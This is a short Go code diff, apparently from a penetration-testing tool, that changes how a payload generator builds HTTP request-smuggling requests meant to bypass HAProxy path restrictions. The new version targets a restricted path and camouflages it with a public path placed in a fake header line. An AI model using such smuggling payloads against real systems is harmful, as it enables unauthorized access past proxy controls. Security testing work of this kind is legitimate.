@@ -53,8 +53,10 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
 		// Craft the smuggled request - avoid \r\n\r\n in body as fasthttp interprets it as end of request
-		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
-			publicPath, host)
+		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
+			path,       // Target/restricted path
+			publicPath, // Public path for header value camouflage
+			host)
 
 		// Use a body that doesn't contain \r\n\r\n to avoid fasthttp parsing issues
 		//smuggledRequest := fmt.Sprintf("x=123&smuggle=1\r\n\r\n")
